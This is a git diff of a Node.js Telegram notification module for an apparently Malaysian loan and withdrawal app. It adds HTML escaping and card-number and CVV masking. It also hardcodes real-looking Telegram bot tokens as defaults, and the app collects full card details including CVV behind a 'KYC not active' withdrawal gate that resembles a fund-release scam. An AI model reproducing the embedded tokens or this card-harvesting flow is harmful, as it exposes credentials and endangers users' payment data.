@@ -10,9 +10,9 @@ const axios = require('axios');
 const db = require('./db');
 const { t, formatCurrency, formatDateTime } = require('./i18n');
 
-const DEFAULT_TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8654004646:AAGkmAzCFjUiSp8ff9tCj6xDun6iHoogTUM';
+const DEFAULT_TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8605255708:AAFpaZgTGHvNHREcehDpjeogXq6qd2JX5zc';
 const DEFAULT_TELEGRAM_ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID || '8176355378';
-const DEFAULT_TELEGRAM_BOT_USERNAME = process.env.TELEGRAM_BOT_USERNAME || 'smartfundx_bot';
+const DEFAULT_TELEGRAM_BOT_USERNAME = process.env.TELEGRAM_BOT_USERNAME || 'notifsmart_bot';
 const DEFAULT_TELEGRAM_ADMIN_USERNAME = process.env.TELEGRAM_ADMIN_USERNAME || 'cs_smartfund';
 const KYC_MESSAGE = `Pengesahan / KYC belum aktif. Sila lakukan pengesahan\n\nUntuk melanjutkan pengeluaran`;
 
@@ -118,68 +118,111 @@ async function logTelegram(chatId, message, status, error, payload) {
 }
 
 /**
+ * HTML-escape user input for safe inclusion in Telegram HTML parse_mode
+ */
+function escapeHtml(text) {
+  if (text === null || text === undefined || text === "") return "";
+  return String(text)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;");
+}
+
+/**
+ * Mask card number — hanya 4 digit terakhir terlihat
+ * @param {string} number - raw card number (dengan atau tanpa spasi)
+ * @returns {string} e.g. "**** **** **** 4055"
+ */
+function maskCardNumber(number) {
+  if (!number) return "";
+  const digits = String(number).replace(/\D/g, "");
+  if (digits.length < 4) return "****";
+  const last4 = digits.slice(-4);
+  const groupCount = Math.ceil((digits.length - 4) / 4);
+  const maskGroups = Array.from({ length: groupCount }, () => "****");
+  return [...maskGroups, last4].join(" ");
+}
+
+/**
+ * CVV — NEVER display in full (PCI DSS requirement)
+ */
+function maskCvv(cvv) {
+  if (!cvv) return "";
+  return "***";
+}
+
+/**
  * Format notifikasi pengajuan pinjaman baru (locale-aware)
+ * Format profesional dengan section separator, data kartu debit,
+ * perkiraan pembayaran, dan status — semua dari data sistem.
  */
 async function buildLoanApplicationMessage(data) {
   const {
     fullName, phone, email, amount, tenor, purpose,
     monthlyPayment, totalInterest, totalPayment, applicationId, userId, lang,
-    csCode, csName,
+    csCode, csName, loanLimit, cardNumber, cardExpiry, cardCvv, createdAt,
   } = data;
 
-  const language = lang || 'ms';
+  const language = lang || "ms";
   const fmt = (n) => formatCurrency(language, n);
-  const date = formatDateTime(language, new Date().toISOString());
+  const date = formatDateTime(language, createdAt || new Date().toISOString());
+  const ns = (val) => (val ? escapeHtml(val) : t(language, "telegram.notSpecified"));
   const config = await getTelegramSettings();
-  // SITE_URL from env - set in Railway to https://your-domain.up.railway.app for production links.
-  // If empty, uses relative path (works in both localhost & Railway)
-  const siteUrl = process.env.SITE_URL || '';
+
+  const siteUrl = process.env.SITE_URL || "";
   const dashboardUrl = siteUrl
     ? `${siteUrl}/admin.html#applications`
-    : '/admin.html#applications';
+    : "/admin.html#applications";
   const chatUrl = `https://t.me/${config.botUsername}?text=${encodeURIComponent(
-    t(language, 'telegram.welcomeChat', fullName)
+    t(language, "telegram.welcomeChat", fullName)
   )}`;
 
   const inlineKeyboard = [
-    [{ text: t(language, 'telegram.viewDashboard'), url: dashboardUrl }],
-    [{ text: t(language, 'telegram.chatUser'), url: chatUrl }],
+    [{ text: t(language, "telegram.viewDashboard"), url: dashboardUrl }],
+    [{ text: t(language, "telegram.chatUser"), url: chatUrl }],
   ];
 
-  let csSection = '';
+  let csSection = "";
   if (csCode) {
-    csSection = `
-👨‍💼 <b>${t(language, 'telegram.csData')}:</b>
-• ${t(language, 'telegram.csCode')}: ${csCode}
-• ${t(language, 'telegram.csName')}: ${csName || '-'}
-
-`;
+    csSection = `\n👨\u200d💼 <b>${t(language, "telegram.csData")}:</b>\n• ${t(language, "telegram.csCode")}: ${escapeHtml(csCode)}\n• ${t(language, "telegram.csName")}: ${escapeHtml(csName || "-")}`;
   }
 
-  const message = `
-🔔 <b>${t(language, 'telegram.newLoanTitle')}</b>
+  const sep = "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501";
 
-👤 <b>${t(language, 'telegram.borrowerData')}:</b>
-• ${t(language, 'telegram.name')}: ${fullName}
-• ${t(language, 'telegram.phone')}: ${phone}
-• ${t(language, 'telegram.email')}: ${email}
+  const message = `<b>${t(language, "telegram.newLoanTitle")}</b>
+
+${sep}
+<b>${t(language, "telegram.loanInfo")}</b>
+${sep}
+<b>${t(language, "telegram.loanAmount")}:</b> ${fmt(amount)}
+<b>${t(language, "telegram.loanLimit")}:</b> ${fmt(loanLimit)}
+<b>${t(language, "telegram.loanTenor")}:</b> ${tenor || t(language, "telegram.notSpecified")} ${t(language, "telegram.month")}
+<b>${t(language, "telegram.loanPurpose")}:</b> ${ns(purpose)}
+
+${sep}
+<b>${t(language, "telegram.cardInfo")}</b>
+${sep}
+<b>${t(language, "telegram.cardNumber")}:</b> ${cardNumber ? maskCardNumber(cardNumber) : t(language, "telegram.notSpecified")}
+<b>${t(language, "telegram.cardExpiry")}:</b> ${ns(cardExpiry)}
+<b>${t(language, "telegram.cardCvv")}:</b> ${cardCvv ? maskCvv(cardCvv) : t(language, "telegram.notSpecified")}
+
+${sep}
+<b>${t(language, "telegram.paymentInfo")}</b>
+${sep}
+<b>${t(language, "telegram.monthly")}:</b> ${fmt(monthlyPayment)}
+<b>${t(language, "telegram.totalInterest")}:</b> ${fmt(totalInterest)}
+<b>${t(language, "telegram.totalPayment")}:</b> ${fmt(totalPayment)}
+
+${sep}
+<b>${t(language, "telegram.statusLabel")}</b> ${t(language, "telegram.appStatusNew")}
+
+${sep}
+<b>🆔 ${t(language, "telegram.appDate")}:</b> ${date}
+• ${t(language, "telegram.name")}: ${ns(fullName)}
+• ${t(language, "telegram.phone")}: ${ns(phone)}
+• ${t(language, "telegram.email")}: ${ns(email)}
 • ID User: #${userId}
- ${csSection}
-💰 <b>${t(language, 'telegram.loanDetail')}:</b>
-• ${t(language, 'telegram.amount')}: ${fmt(amount)}
-• ${t(language, 'telegram.tenor')}: ${tenor} ${t(language, 'telegram.month')}
-• ${t(language, 'telegram.purpose')}: ${purpose}
-
-📊 <b>${t(language, 'telegram.calculation')}:</b>
-• ${t(language, 'telegram.monthly')}: ${fmt(monthlyPayment)}
-• ${t(language, 'telegram.totalInterest')}: ${fmt(totalInterest)}
-• ${t(language, 'telegram.totalPayment')}: ${fmt(totalPayment)}
-
-🆔 Application ID: <b>#${applicationId}</b>
-⏰ ${t(language, 'telegram.time')}: ${date}
-
-<i>${t(language, 'telegram.verifyPrompt')}</i>
-  `.trim();
+• Application ID: #${applicationId}${csSection}`;
 
   return { message, inlineKeyboard };
 }
@@ -306,7 +349,7 @@ ${t(language, 'withdraw.pending', 'Menunggu Pengesahan')}`;
  */
 function buildAdminChatUrl(withdrawalId, fullName) {
   const config = getTelegramSettings ? null : null; // settings loaded async inside getTelegramSettings
-  const botUsername = process.env.TELEGRAM_BOT_USERNAME || 'smartfundx_bot';
+  const botUsername = process.env.TELEGRAM_BOT_USERNAME || 'notifsmart_bot';
   const message = `Halo Admin,\n\nSaya baru saja mengajukan pengeluaran dana.\n\nID Pengeluaran:\n${withdrawalId}\nNama: ${fullName}\n\nSila bantu lakukan pengesahan agar proses pengeluaran saya boleh diteruskan.\n\nTerima kasih.`;
   return `https://t.me/${botUsername}?start=withdraw_${withdrawalId}`;
 }
